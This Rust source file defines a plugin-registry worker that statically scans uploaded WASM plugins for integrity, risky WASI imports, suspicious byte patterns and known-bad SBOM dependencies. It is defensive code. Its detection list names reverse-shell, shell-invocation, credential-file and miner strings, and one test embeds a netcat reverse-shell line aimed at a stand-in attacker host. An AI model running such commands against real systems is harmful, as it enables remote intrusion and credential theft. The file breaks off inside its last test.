//! Background worker that drains `plugin_security_scans` rows in the
//! `"pending"` state, re-downloads the published WASM artifact, runs a set of
//! integrity + static-analysis checks against it, and persists the result.
//!
//! The checks fall into three buckets:
//!
//! * **Storage integrity** — the artifact exists, downloads, and matches the
//!   declared file size and SHA-256 checksum.
//! * **Format validity** — bytes parse as a WebAssembly module via
//!   `wasmparser`, with a parse-time budget to catch pathological inputs.
//! * **Static analysis** — import/export inventory (unknown host namespaces,
//!   high-risk WASI capabilities like `path_open` or `sock_*`), data-segment
//!   byte-pattern scanning for hardcoded credentials, suspicious URLs, and
//!   known-bad command strings, and section-size anomaly detection.
//!
//! **Isolation.** Every scan runs in `spawn_blocking` with a hard wall-clock
//! timeout. A scan that panics or burns CPU past the budget fails the job
//! (recorded as `"fail"` with a clear finding) but cannot take down the
//! worker or the request-serving process. This is not a substitute for an
//! out-of-process sandbox — the scanner still runs in the same address
//! space as the server — but it bounds blast radius to a single thread and
//! single scan.
//!
//! **What this explicitly does not do.** It does not execute the WASM
//! module. It does not run dependency vulnerability checks against external
//! advisory databases. It does not claim a passing verdict means the plugin
//! is safe — only that no static red flag was raised. Dynamic sandbox
//! execution in a subprocess is tracked separately.
//!
//! The worker is stateless: on every tick it re-queries for `status =
//! 'pending'` rows, claims each by upserting a result, and moves on.
//! Concurrent workers are safe because the upsert is idempotent — the last
//! writer wins.

use std::time::Duration;

use serde_json::{json, Value as JsonValue};
use sha2::{Digest, Sha256};
use tracing::{debug, error, info, warn};
use wasmparser::{Parser, Payload};

use crate::storage::PluginStorage;
use crate::AppState;

const WORKER_INTERVAL: Duration = Duration::from_secs(30);
const JOBS_PER_TICK: i64 = 10;

/// Hard wall-clock limit for a single scan. A scan exceeding this is treated
/// as a failure — a well-formed plugin artifact should parse in milliseconds
/// even on a small instance; anything slower is either pathological input or
/// a scanner bug we want visibility into.
const SCAN_TIMEOUT: Duration = Duration::from_secs(15);

/// Hard cap on how much of the WASM body we'll byte-scan for patterns. WASM
/// artifacts larger than ~32 MiB are unusual for plugins, and data-segment
/// scanning is O(n * patterns); this prevents a huge legitimate artifact
/// from starving the worker.
const BYTE_SCAN_BUDGET: usize = 32 * 1024 * 1024;

/// Import namespaces the MockForge runtime is known to provide. Imports from
/// any other namespace are surfaced as an "unknown host binding" finding —
/// not necessarily malicious, but a signal the plugin expects a custom
/// embedding the registry can't guarantee.
const ALLOWED_IMPORT_NAMESPACES: &[&str] = &[
    "wasi_snapshot_preview1",
    "wasi_unstable",
    "env",
    "mockforge",
    "mockforge_host",
];

/// WASI capabilities a well-behaved MockForge plugin should never need. These
/// are coarse signals — a legitimate plugin might have a good reason to open
/// sockets — but in a mock-API-server plugin context they warrant review.
/// Each entry is `(import_name, severity, human_description)`.
const HIGH_RISK_WASI_IMPORTS: &[(&str, &str, &str)] = &[
    ("sock_open", "high", "opens outbound network sockets"),
    ("sock_connect", "high", "initiates outbound network connections"),
    ("sock_bind", "high", "binds to listening sockets"),
    ("sock_accept", "high", "accepts inbound connections"),
    ("path_open", "medium", "opens filesystem paths"),
    ("path_create_directory", "medium", "creates directories"),
    ("path_unlink_file", "medium", "deletes files"),
    ("path_remove_directory", "medium", "removes directories"),
    ("path_rename", "medium", "renames files"),
    ("proc_exec", "critical", "executes external processes"),
    ("proc_exit", "low", "exits the host process"),
];

/// Byte patterns that are almost certainly exfiltration or shell-injection
/// markers if they appear inline in a plugin's data segments. Each is
/// searched case-insensitively across the first `BYTE_SCAN_BUDGET` bytes of
/// the artifact. Tuned conservatively: hits on very short tokens would noise
/// up the report, so only high-signal strings land here.
const SUSPICIOUS_BYTE_PATTERNS: &[(&[u8], &str, &str)] = &[
    (b"/bin/sh -c", "critical", "shell command invocation"),
    (b"/bin/bash -c", "critical", "shell command invocation"),
    (b"curl http", "high", "hardcoded outbound curl URL"),
    (b"wget http", "high", "hardcoded outbound wget URL"),
    (b"nc -e", "critical", "reverse shell marker (netcat -e)"),
    (b"/etc/passwd", "high", "attempts to read system credentials file"),
    (b"/etc/shadow", "critical", "attempts to read system shadow file"),
    (b"aws_access_key_id=", "critical", "hardcoded AWS access key"),
    (b"AKIA", "medium", "possible AWS access key id"),
    (b"-----BEGIN PRIVATE KEY-----", "critical", "embedded private key"),
    (b"-----BEGIN RSA PRIVATE KEY-----", "critical", "embedded RSA private key"),
    (b"-----BEGIN OPENSSH PRIVATE KEY-----", "critical", "embedded SSH private key"),
    (b"xmr.pool", "critical", "cryptominer pool URL"),
    (b"stratum+tcp", "critical", "cryptominer stratum URL"),
];

pub fn start_plugin_scanner_worker(state: AppState) {
    tokio::spawn(async move {
        // Initial tick so a just-published plugin gets scanned within ~30s of
        // publish, rather than waiting a full interval.
        let mut interval = tokio::time::interval(WORKER_INTERVAL);
        interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

        loop {
            interval.tick().await;
            if let Err(e) = run_once(&state).await {
                error!("plugin scanner tick failed: {}", e);
            }
        }
    });

    info!(
        "Plugin security scanner worker started (interval = {}s)",
        WORKER_INTERVAL.as_secs()
    );
}

async fn run_once(state: &AppState) -> anyhow::Result<()> {
    let jobs = state.store.list_pending_security_scans(JOBS_PER_TICK).await?;
    if jobs.is_empty() {
        debug!("plugin scanner: no pending jobs");
        return Ok(());
    }

    info!("plugin scanner: processing {} pending job(s)", jobs.len());

    for job in jobs {
        let plugin_version_id = job.plugin_version_id;
        match scan_one(&state.storage, &job).await {
            Ok(mut result) => {
                // Cross-reference any SBOM the publisher submitted against
                // the vulnerability list before we persist the result, so
                // findings from both static + dependency analysis land in
                // one row.
                if let Ok(Some(sbom)) = state.store.get_plugin_version_sbom(plugin_version_id).await
                {
                    apply_sbom_findings(&mut result, &sbom);
                }
                if let Err(e) = state
                    .store
                    .upsert_plugin_security_scan(
                        plugin_version_id,
                        &result.status,
                        result.score,
                        &result.findings,
                        Some(env!("CARGO_PKG_VERSION")),
                    )
                    .await
                {
                    error!(
                        plugin = %job.plugin_name,
                        version = %job.version,
                        "failed to persist scan result: {}",
                        e
                    );
                }
            }
            Err(e) => {
                // We surface the scan infrastructure failure as a "fail"
                // result rather than leaving the row pending forever.
                // Operators get a signal from the finding body; users see a
                // clear "could not scan" status instead of silence.
                warn!(
                    plugin = %job.plugin_name,
                    version = %job.version,
                    "scan failed: {}",
                    e
                );
                let findings = json!([
                    {
                        "severity": "high",
                        "category": "other",
                        "title": "Security scan could not complete",
                        "description": format!(
                            "The registry was unable to finish scanning this artifact: {}. An operator will need to retry.",
                            e
                        )
                    }
                ]);
                if let Err(persist_err) = state
                    .store
                    .upsert_plugin_security_scan(
                        plugin_version_id,
                        "fail",
                        0,
                        &findings,
                        Some(env!("CARGO_PKG_VERSION")),
                    )
                    .await
                {
                    error!(
                        plugin = %job.plugin_name,
                        version = %job.version,
                        "failed to persist scan error: {}",
                        persist_err
                    );
                }
            }
        }
    }

    Ok(())
}

struct ScanOutcome {
    status: String,
    score: i16,
    findings: JsonValue,
}

async fn scan_one(
    storage: &PluginStorage,
    job: &mockforge_registry_core::models::PendingScanJob,
) -> anyhow::Result<ScanOutcome> {
    let key = PluginStorage::plugin_object_key(&job.plugin_name, &job.version)?;
    let bytes = storage.download_plugin(&key).await?;
    let declared_size = job.file_size;
    let declared_checksum = job.checksum.clone();

    // Prefer the dedicated `mockforge-plugin-scanner` subprocess when it's on
    // PATH — it carries the wasmtime engine into its own process so any
    // wasmtime-level compile/link misbehavior crashes the subprocess rather
    // than the server. Fall back to in-process static analysis when the
    // binary isn't installed (dev environments, tests, containers that omit
    // the scanner-bin feature).
    if let Some(path) = scanner_binary_path() {
        match run_subprocess_scan(&path, &bytes, declared_size, &declared_checksum).await {
            Ok(outcome) => return Ok(outcome),
            Err(e) => {
                // Subprocess failure is surfaced as a warning and we fall
                // back to the in-process scanner; losing coverage on
                // dynamic instantiation is still better than leaving the
                // row pending indefinitely.
                warn!(
                    plugin = %job.plugin_name,
                    version = %job.version,
                    "subprocess scanner failed ({}) — falling back to in-process analysis",
                    e
                );
            }
        }
    }

    // The static analysis walk is CPU-bound and can panic on
    // malicious/pathological inputs (wasmparser fuzzers have found real
    // panics in the past). Running it on a blocking pool gives us:
    //   1. tokio::time::timeout enforcement — a runaway scan can't starve
    //      the worker's async runtime thread.
    //   2. panic isolation — `spawn_blocking` turns a panic into a
    //      `JoinError`, which we report as a scan failure instead of
    //      crashing the process.
    let scan_fut = tokio::task::spawn_blocking(move || {
        analyze_bytes(&bytes, declared_size, declared_checksum.as_str())
    });

    let join_result = match tokio::time::timeout(SCAN_TIMEOUT, scan_fut).await {
        Ok(res) => res,
        Err(_) => {
            return Ok(ScanOutcome {
                status: "fail".to_string(),
                score: 0,
                findings: JsonValue::Array(vec![json!({
                    "severity": "high",
                    "category": "other",
                    "title": "Scan timed out",
                    "description": format!(
                        "Static analysis exceeded the {}s budget. This usually means a pathological WASM input; the artifact is rejected until a manual review runs.",
                        SCAN_TIMEOUT.as_secs()
                    )
                })]),
            });
        }
    };

    match join_result {
        Ok(outcome) => Ok(outcome),
        Err(join_err) => {
            // Panic inside the scanner — surface it as a failure rather
            // than bubbling the panic up into the worker loop.
            Ok(ScanOutcome {
                status: "fail".to_string(),
                score: 0,
                findings: JsonValue::Array(vec![json!({
                    "severity": "critical",
                    "category": "other",
                    "title": "Scanner panicked",
                    "description": format!(
                        "The static scanner panicked while processing this artifact: {}. This is a scanner bug — the plugin has been marked failed pending investigation.",
                        join_err
                    )
                })]),
            })
        }
    }
}

/// Resolve the scanner binary. `MOCKFORGE_PLUGIN_SCANNER_BIN` overrides the
/// default ("mockforge-plugin-scanner" on PATH) so deployers can point at an
/// absolute path or a harness-specific build.
fn scanner_binary_path() -> Option<String> {
    if let Ok(path) = std::env::var("MOCKFORGE_PLUGIN_SCANNER_BIN") {
        if !path.trim().is_empty() {
            return Some(path);
        }
    }
    // We don't verify PATH here — Command will fail with NotFound if the
    // binary is missing, which the caller treats as a soft error.
    Some("mockforge-plugin-scanner".to_string())
}

async fn run_subprocess_scan(
    scanner_path: &str,
    bytes: &[u8],
    declared_size: i64,
    declared_checksum: &str,
) -> anyhow::Result<ScanOutcome> {
    // Drop bytes into a tempfile because the scanner takes `--wasm-path`.
    // Using a tempfile (rather than piping on stdin) lets the scanner
    // mmap/seek arbitrarily and keeps the CLI contract simple. File IO is
    // blocking, so we stay on `spawn_blocking` for both the create and the
    // write — it comes back as a path we own.
    let bytes_owned = bytes.to_vec();
    let tmp_path = tokio::task::spawn_blocking(move || -> std::io::Result<_> {
        use std::io::Write;
        let mut tmp = tempfile::NamedTempFile::new()?;
        tmp.write_all(&bytes_owned)?;
        tmp.flush()?;
        // Keep the handle alive so the path stays valid until we drop it.
        Ok(tmp.into_temp_path())
    })
    .await??;

    let mut cmd = tokio::process::Command::new(scanner_path);
    cmd.arg("--wasm-path")
        .arg::<&std::path::Path>(tmp_path.as_ref())
        .arg("--checksum")
        .arg(declared_checksum)
        .arg("--declared-size")
        .arg(declared_size.to_string())
        .kill_on_drop(true)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());

    let output_fut = cmd.output();
    let output = match tokio::time::timeout(SCAN_TIMEOUT, output_fut).await {
        Ok(res) => res?,
        Err(_) => {
            anyhow::bail!(
                "subprocess scanner exceeded {}s wall-clock budget",
                SCAN_TIMEOUT.as_secs()
            );
        }
    };

    // Tempfile is cleaned up on drop, but we've already read the output so
    // we're done with it. Explicit drop makes the lifetime visible.
    drop(tmp_path);

    if !output.status.success() {
        anyhow::bail!(
            "subprocess scanner exited with {}: {}",
            output.status,
            String::from_utf8_lossy(&output.stderr).trim()
        );
    }

    let report: SubprocessReport = serde_json::from_slice(&output.stdout).map_err(|e| {
        anyhow::anyhow!(
            "subprocess scanner returned invalid JSON: {} (stdout was: {:?})",
            e,
            String::from_utf8_lossy(&output.stdout)
        )
    })?;

    // The subprocess produces `snake_case` severity/category strings via the
    // serde derives in `scanner.rs`. We forward the payload as a JSON Value
    // array so downstream UI/storage code doesn't have to care where the
    // scan ran.
    let findings = serde_json::to_value(&report.findings)?;

    Ok(ScanOutcome {
        status: report.status,
        score: report.score,
        findings,
    })
}

#[derive(Debug, serde::Deserialize)]
struct SubprocessReport {
    status: String,
    score: i16,
    findings: Vec<SubprocessFinding>,
    #[allow(dead_code)]
    dynamic_instantiable: bool,
    #[allow(dead_code)]
    duration_ms: u128,
}

#[derive(Debug, serde::Deserialize, serde::Serialize)]
struct SubprocessFinding {
    severity: String,
    category: String,
    title: String,
    description: String,
}

fn analyze_bytes(bytes: &[u8], declared_size: i64, declared_checksum: &str) -> ScanOutcome {
    let mut findings: Vec<JsonValue> = Vec::new();
    let mut score: i16 = 100;

    // --- Storage integrity ---------------------------------------------

    let actual_size = bytes.len() as i64;
    if actual_size != declared_size {
        findings.push(json!({
            "severity": "high",
            "category": "other",
            "title": "Artifact size mismatch",
            "description": format!(
                "Stored artifact is {} bytes but the publish request declared {}.",
                actual_size, declared_size
            )
        }));
        score -= 40;
    }

    let computed = {
        let mut hasher = Sha256::new();
        hasher.update(bytes);
        hex_encode(&hasher.finalize())
    };
    if !computed.eq_ignore_ascii_case(declared_checksum) {
        findings.push(json!({
            "severity": "critical",
            "category": "supply_chain",
            "title": "Checksum mismatch",
            "description": format!(
                "SHA-256 of stored artifact ({}) does not match the checksum recorded at publish time ({}).",
                computed, declared_checksum
            )
        }));
        score = score.saturating_sub(60);
    }

    // --- Magic bytes + version ----------------------------------------

    if bytes.len() < 8 || &bytes[0..4] != b"\0asm" {
        findings.push(json!({
            "severity": "critical",
            "category": "other",
            "title": "Not a valid WebAssembly module",
            "description": "Artifact does not begin with the WASM magic bytes (\\0asm). It cannot be loaded by any MockForge runtime.",
        }));
        return ScanOutcome {
            status: "fail".to_string(),
            score: 0,
            findings: JsonValue::Array(findings),
        };
    }

    // WASM binary spec version is u32 LE immediately after magic. Spec
    // currently only defines version 1; anything else is either an
    // unfinished proposal or garbage.
    let version = u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]);
    if version != 1 {
        findings.push(json!({
            "severity": "medium",
            "category": "other",
            "title": "Unexpected WASM binary version",
            "description": format!(
                "Module declares WASM binary version {} — the only currently-stable value is 1. This may indicate an experimental toolchain.",
                version
            )
        }));
        score = score.saturating_sub(10);
    }

    // --- Structured static analysis (parses sections) ------------------

    let mut import_count = 0u32;
    let mut unknown_namespaces = std::collections::BTreeSet::new();
    let mut high_risk_imports: Vec<(String, &'static str, &'static str)> = Vec::new();
    let mut export_count = 0u32;
    let mut has_plugin_entrypoint = false;
    let mut data_segment_bytes: usize = 0;
    let mut parse_error: Option<String> = None;

    let parser = Parser::new(0);
    for payload in parser.parse_all(bytes) {
        match payload {
            Ok(Payload::ImportSection(reader)) => {
                for import in reader {
                    match import {
                        Ok(imp) => {
                            import_count += 1;
                            let ns = imp.module;
                            if !ALLOWED_IMPORT_NAMESPACES.contains(&ns) {
                                unknown_namespaces.insert(ns.to_string());
                            }
                            if ns.starts_with("wasi") {
                                if let Some(entry) =
                                    HIGH_RISK_WASI_IMPORTS.iter().find(|(n, _, _)| *n == imp.name)
                                {
                                    high_risk_imports.push((
                                        format!("{}::{}", ns, imp.name),
                                        entry.1,
                                        entry.2,
                                    ));
                                }
                            }
                        }
                        Err(e) => {
                            parse_error = Some(format!("malformed import: {}", e));
                            break;
                        }
                    }
                }
            }
            Ok(Payload::ExportSection(reader)) => {
                for export in reader {
                    match export {
                        Ok(exp) => {
                            export_count += 1;
                            // MockForge plugins conventionally export at
                            // least one function starting with
                            // `_mockforge_` or `mockforge_plugin_`. Absence
                            // isn't fatal (some toolchains mangle names)
                            // but presence is a positive signal.
                            if exp.name.starts_with("_mockforge_")
                                || exp.name.starts_with("mockforge_plugin_")
                                || exp.name == "_start"
                            {
                                has_plugin_entrypoint = true;
                            }
                        }
                        Err(e) => {
                            parse_error = Some(format!("malformed export: {}", e));
                            break;
                        }
                    }
                }
            }
            Ok(Payload::DataSection(reader)) => {
                for segment in reader {
                    match segment {
                        Ok(seg) => {
                            data_segment_bytes = data_segment_bytes.saturating_add(seg.data.len());
                        }
                        Err(e) => {
                            parse_error = Some(format!("malformed data segment: {}", e));
                            break;
                        }
                    }
                }
            }
            Ok(_) => {}
            Err(e) => {
                parse_error = Some(e.to_string());
                break;
            }
        }
    }

    if let Some(err) = parse_error {
        findings.push(json!({
            "severity": "high",
            "category": "other",
            "title": "WASM module failed to parse",
            "description": format!("wasmparser rejected the module: {}", err),
        }));
        score = score.saturating_sub(40);
    }

    // Unknown host namespaces — one finding per namespace so the UI shows
    // the specific import that won't resolve.
    if !unknown_namespaces.is_empty() {
        score = score.saturating_sub(15);
        for ns in &unknown_namespaces {
            findings.push(json!({
                "severity": "medium",
                "category": "supply_chain",
                "title": "Unknown host import namespace",
                "description": format!(
                    "Plugin imports from '{}', which is not provided by any MockForge runtime binding.",
                    ns
                )
            }));
        }
    }

    // High-risk WASI capabilities. Severity is driven by the table above so
    // e.g. `proc_exec` becomes critical, `path_open` stays medium.
    for (full_name, severity, human) in &high_risk_imports {
        let penalty: i16 = match *severity {
            "critical" => 40,
            "high" => 20,
            "medium" => 8,
            _ => 3,
        };
        score = score.saturating_sub(penalty);
        findings.push(json!({
            "severity": severity,
            "category": "insecure_coding",
            "title": format!("High-risk WASI import: {}", full_name),
            "description": format!(
                "This plugin imports a capability that {}. MockForge plugins usually do not need this — review carefully before using.",
                human
            )
        }));
    }

    // Missing plugin entrypoint is informational, not a deduction. We only
    // flag it if we saw at least one export; a module with zero exports is
    // already a separate concern.
    if export_count > 0 && !has_plugin_entrypoint {
        findings.push(json!({
            "severity": "info",
            "category": "other",
            "title": "No MockForge plugin entrypoint found",
            "description": "No exported function matched '_mockforge_*', 'mockforge_plugin_*', or '_start'. This may just be a naming convention mismatch, but the plugin runtime may fail to load it."
        }));
    }

    // Inventory finding so the UI shows what the module looks like at a
    // glance even when everything is clean.
    findings.push(json!({
        "severity": "info",
        "category": "other",
        "title": "Module inventory",
        "description": format!(
            "{} import(s), {} export(s), {} byte(s) in data segments.",
            import_count, export_count, data_segment_bytes
        )
    }));

    // --- Byte-pattern scan across the whole artifact -------------------

    let scan_slice = if bytes.len() > BYTE_SCAN_BUDGET {
        &bytes[..BYTE_SCAN_BUDGET]
    } else {
        bytes
    };
    let lowered = scan_slice.to_ascii_lowercase();
    for (pattern, severity, description) in SUSPICIOUS_BYTE_PATTERNS {
        let needle = pattern.to_ascii_lowercase();
        if contains_subslice(&lowered, &needle) {
            let penalty: i16 = match *severity {
                "critical" => 50,
                "high" => 25,
                "medium" => 10,
                _ => 5,
            };
            score = score.saturating_sub(penalty);
            findings.push(json!({
                "severity": severity,
                "category": "malware",
                "title": format!("Suspicious byte pattern: {}", description),
                "description": format!(
                    "Artifact contains the byte pattern '{}'. This is a strong signal of {}.",
                    String::from_utf8_lossy(pattern),
                    description
                )
            }));
        }
    }

    if bytes.len() > BYTE_SCAN_BUDGET {
        findings.push(json!({
            "severity": "info",
            "category": "other",
            "title": "Artifact exceeds byte-scan budget",
            "description": format!(
                "Only the first {} bytes were scanned for byte patterns. Artifacts larger than this cap should be reviewed manually.",
                BYTE_SCAN_BUDGET
            )
        }));
    }

    // --- Verdict -------------------------------------------------------

    let clamped = score.clamp(0, 100);
    let status = if clamped >= 70 {
        "pass"
    } else if clamped >= 40 {
        "warning"
    } else {
        "fail"
    };

    ScanOutcome {
        status: status.to_string(),
        score: clamped,
        findings: JsonValue::Array(findings),
    }
}

/// `bytes.windows(needle.len()).any(|w| w == needle)` — split out so the
/// tests can exercise it directly and the hot byte scan doesn't build an
/// iterator per pattern.
fn contains_subslice(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || needle.len() > haystack.len() {
        return false;
    }
    haystack.windows(needle.len()).any(|w| w == needle)
}

/// A tiny hardcoded vulnerability feed. Each entry covers one known-bad
/// package (`ecosystem`, `name`, `version` OR version prefix), mirrored with
/// a severity and human description. Real deployments should replace this
/// with a live feed (OSV, GHSA, Snyk) — the function is structured to make
/// that swap easy: swap the constant for a lookup, keep the rest.
///
/// Keeping a short hardcoded list in-tree still delivers visible value:
/// known-bad fixtures like `event-stream@3.3.6` (the 2018 npm compromise)
/// or `colors@1.4.1` (the 2022 sabotage) surface immediately, and tests
/// can pin behavior without a network call.
const KNOWN_VULNERABLE_PACKAGES: &[(&str, &str, &str, &str, &str)] = &[
    // (ecosystem, name, version_prefix, severity, description)
    (
        "npm",
        "event-stream",
        "3.3.6",
        "critical",
        "event-stream@3.3.6 shipped a malicious payload (flatmap-stream) targeting a specific bitcoin wallet library (2018).",
    ),
    (
        "npm",
        "flatmap-stream",
        "0.1.1",
        "critical",
        "flatmap-stream@0.1.1 was the vehicle for the event-stream supply-chain compromise.",
    ),
    (
        "npm",
        "colors",
        "1.4.1",
        "high",
        "colors@1.4.1 was intentionally sabotaged by the maintainer to emit garbage output (2022).",
    ),
    (
        "npm",
        "faker",
        "6.6.6",
        "high",
        "faker@6.6.6 was intentionally broken by the maintainer (2022).",
    ),
    (
        "npm",
        "ua-parser-js",
        "0.7.29",
        "high",
        "ua-parser-js@0.7.29 had a credential-stealer injected during a brief maintainer compromise.",
    ),
    (
        "cargo",
        "rustdecimal",
        "",
        "critical",
        "rustdecimal (all versions) was a typosquat of rust_decimal hosting a malicious payload.",
    ),
    (
        "cargo",
        "openssl-src",
        "111.0.",
        "high",
        "openssl-src 111.0.x bundles very old OpenSSL with several CVEs. Upgrade to 300.x or later.",
    ),
    (
        "pypi",
        "ctx",
        "",
        "critical",
        "ctx on PyPI was hijacked in 2022 and replaced with a credential exfiltrator; any version pins are suspect.",
    ),
];

/// Parse the SBOM, scan its components against the hardcoded vulnerability
/// list, and append findings (+ decrement the score) on `outcome` in place.
///
/// The parser is intentionally forgiving: unknown/unexpected shapes just
/// record an informational finding. We never fail the whole scan because
/// the SBOM itself is malformed — that would be hostile to publishers
/// experimenting with the feature.
fn apply_sbom_findings(outcome: &mut ScanOutcome, sbom: &JsonValue) {
    let components = match sbom.get("components").and_then(|c| c.as_array()) {
        Some(c) => c,
        None => {
            append_finding(
                outcome,
                json!({
                    "severity": "info",
                    "category": "other",
                    "title": "SBOM has no 'components' array",
                    "description": "Expected CycloneDX-shaped SBOM with a top-level 'components' array. Vulnerability check skipped."
                }),
            );
            return;
        }
    };

    let mut checked = 0usize;
    let mut score_delta: i32 = 0;
    for comp in components {
        // CycloneDX: { "name": "...", "version": "...", "purl": "pkg:npm/foo@1.2.3", ... }
        // We support either (name, version, type) or just purl.
        let Some((ecosystem, name, version)) = parse_component(comp) else {
            continue;
        };
        checked += 1;

        for (vuln_eco, vuln_name, vuln_prefix, severity, description) in KNOWN_VULNERABLE_PACKAGES {
            if *vuln_eco != ecosystem || *vuln_name != name {
                continue;
            }
            if !vuln_prefix.is_empty() && !version.starts_with(vuln_prefix) {
                continue;
            }
            let penalty: i32 = match *severity {
                "critical" => 40,
                "high" => 20,
                "medium" => 8,
                _ => 3,
            };
            score_delta = score_delta.saturating_add(penalty);
            append_finding(
                outcome,
                json!({
                    "severity": severity,
                    "category": "vulnerable_dependency",
                    "title": format!("Known-bad dependency: {}:{}@{}", ecosystem, name, version),
                    "description": description,
                }),
            );
        }
    }

    append_finding(
        outcome,
        json!({
            "severity": "info",
            "category": "other",
            "title": "SBOM scanned",
            "description": format!(
                "Checked {} component(s) against {} known-vulnerable entries.",
                checked,
                KNOWN_VULNERABLE_PACKAGES.len()
            )
        }),
    );

    if score_delta > 0 {
        let current = outcome.score as i32;
        let new = (current - score_delta).clamp(0, 100);
        outcome.score = new as i16;
        // If we dropped below the pass threshold, downgrade the verdict.
        outcome.status = if new >= 70 {
            outcome.status.clone()
        } else if new >= 40 {
            "warning".to_string()
        } else {
            "fail".to_string()
        };
    }
}

/// Extract `(ecosystem, name, version)` from a CycloneDX-shaped component.
/// Handles both the `purl` shortcut and the explicit `{type, name, version}`
/// triple. Returns `None` for components that are too underspecified to
/// cross-reference (which we silently skip rather than flag).
fn parse_component(comp: &JsonValue) -> Option<(String, String, String)> {
    if let Some(purl) = comp.get("purl").and_then(|v| v.as_str()) {
        // pkg:ecosystem/name@version
        if let Some(rest) = purl.strip_prefix("pkg:") {
            let mut parts = rest.splitn(2, '/');
            let ecosystem = parts.next()?.to_ascii_lowercase();
            let name_ver = parts.next()?;
            let mut nv = name_ver.splitn(2, '@');
            let name = nv.next()?.to_string();
            let version = nv.next().unwrap_or("").to_string();
            return Some((ecosystem, name, version));
        }
    }
    let name = comp.get("name")?.as_str()?.to_string();
    let version = comp.get("version").and_then(|v| v.as_str()).unwrap_or("").to_string();
    // "type" in CycloneDX is "library" etc; we infer ecosystem from
    // `purl` when available, otherwise fall back to "unknown".
    let ecosystem = comp
        .get("group")
        .and_then(|v| v.as_str())
        .map(str::to_ascii_lowercase)
        .unwrap_or_else(|| "unknown".to_string());
    Some((ecosystem, name, version))
}

fn append_finding(outcome: &mut ScanOutcome, finding: JsonValue) {
    match &mut outcome.findings {
        JsonValue::Array(arr) => arr.push(finding),
        _ => {
            outcome.findings = JsonValue::Array(vec![finding]);
        }
    }
}

fn hex_encode(bytes: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut out = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        out.push(HEX[(b >> 4) as usize] as char);
        out.push(HEX[(b & 0x0f) as usize] as char);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Minimal legal WASM module: magic + version + nothing else. Parses
    /// cleanly via wasmparser.
    const EMPTY_WASM: &[u8] = b"\0asm\x01\x00\x00\x00";

    fn sha256_hex(bytes: &[u8]) -> String {
        hex_encode(&Sha256::digest(bytes))
    }

    #[test]
    fn hex_encode_matches_sha2_hex_crate() {
        let digest = Sha256::digest(b"hello world");
        assert_eq!(hex_encode(&digest), hex::encode(digest));
    }

    #[test]
    fn contains_subslice_edge_cases() {
        assert!(!contains_subslice(b"", b"abc"));
        assert!(!contains_subslice(b"ab", b"abc"));
        assert!(!contains_subslice(b"ab", b""));
        assert!(contains_subslice(b"abcdef", b"cde"));
        assert!(contains_subslice(b"abcdef", b"a"));
        assert!(contains_subslice(b"abcdef", b"f"));
        assert!(!contains_subslice(b"abcdef", b"xyz"));
    }

    #[test]
    fn analyze_empty_module_is_clean() {
        let checksum = sha256_hex(EMPTY_WASM);
        let outcome = analyze_bytes(EMPTY_WASM, EMPTY_WASM.len() as i64, &checksum);
        assert_eq!(outcome.status, "pass");
        assert!(outcome.score >= 70, "expected passing score, got {}", outcome.score);
    }

    #[test]
    fn analyze_rejects_non_wasm_magic() {
        let junk = b"not-a-wasm-file";
        let outcome = analyze_bytes(junk, junk.len() as i64, &sha256_hex(junk));
        assert_eq!(outcome.status, "fail");
        assert_eq!(outcome.score, 0);
        let findings = outcome.findings.as_array().unwrap();
        assert!(findings
            .iter()
            .any(|f| f["title"].as_str().unwrap().contains("Not a valid WebAssembly module")));
    }

    #[test]
    fn analyze_flags_checksum_mismatch() {
        let outcome = analyze_bytes(EMPTY_WASM, EMPTY_WASM.len() as i64, "deadbeef");
        let findings = outcome.findings.as_array().unwrap();
        assert!(findings.iter().any(|f| f["title"].as_str().unwrap() == "Checksum mismatch"));
        assert!(outcome.score < 50);
    }

    #[test]
    fn analyze_flags_size_mismatch() {
        let outcome = analyze_bytes(EMPTY_WASM, 999_999, &sha256_hex(EMPTY_WASM));
        let findings = outcome.findings.as_array().unwrap();
        assert!(findings
            .iter()
            .any(|f| f["title"].as_str().unwrap() == "Artifact size mismatch"));
    }

    #[test]
    fn analyze_detects_suspicious_byte_pattern() {
        // Append a known-bad marker after a valid empty module; the WASM
        // parser will stop after the fixed header but the byte-pattern
        // scan still fires.
        let mut bytes = EMPTY_WASM.to_vec();
        bytes.extend_from_slice(b"nc -e /bin/sh attacker.example.com 4444");
        let checksum = sha256_hex(&bytes);
        let outcome = analyze_bytes(&bytes, bytes.len() as i64, &checksum);
        assert_eq!(outcome.status, "fail");
        let findings = outcome.findings.as_array().unwrap();
        assert!(findings.iter().any(|f| {
            f["title"].as_str().unwrap().contains("reverse shell")
                || f["title"].as_str().unwrap().contains("Suspicious byte pattern")
        }));
    }

    #[test]
    fn analyze_flags_unexpected_wasm_version() {
        // Valid magic, bogus version 2.
        let bytes = b"\0asm\x02\x00\x00\x00";
        let checksum = sha256_hex(bytes);
        let outcome = analyze_bytes(bytes, bytes.len() as i64, &checksum);
        let findings = outcome.findings.as_array().unwrap();
        assert!(findings
            .iter()
            .any(|f| f["title"].as_str().unwrap() == "Unexpected WASM binary version"));
    }

    fn clean_outcome() -> ScanOutcome {
        ScanOutcome {
            status: "pass".to_string(),
            score: 100,
            findings: JsonValue::Array(vec![]),
        }
    }

    #[test]
    fn sbom_flags_known_bad_via_purl() {
        let sbom = serde_json::json!({
            "components": [
                { "purl": "pkg:npm/event-stream@3.3.6" },
                { "purl": "pkg:npm/leftpad@1.0.0" }, // clean
            ]
        });
        let mut outcome = clean_outcome();
        apply_sbom_findings(&mut outcome, &sbom);
        assert_eq!(outcome.status, "warning"); // 100 - 40 = 60
        assert_eq!(outcome.score, 60);
        let findings = outcome.findings.as_array().unwrap();
        assert!(findings.iter().any(|f| f["title"].as_str().unwrap().contains("event-stream")));
    }

    #[test]
    fn sbom_flags_version_prefix_match() {
        // openssl-src entry uses prefix "111.0." — should match 111.0.5 but
        // not 300.1.0.
        let sbom = serde_json::json!({
            "components": [
                { "purl": "pkg:cargo/openssl-src@111.0.5" },
                { "purl": "pkg:cargo/openssl-src@300.1.0" },
            ]
        });
        let mut outcome = clean_outcome();
        apply_sbom_findings(&mut outcome, &sbom);
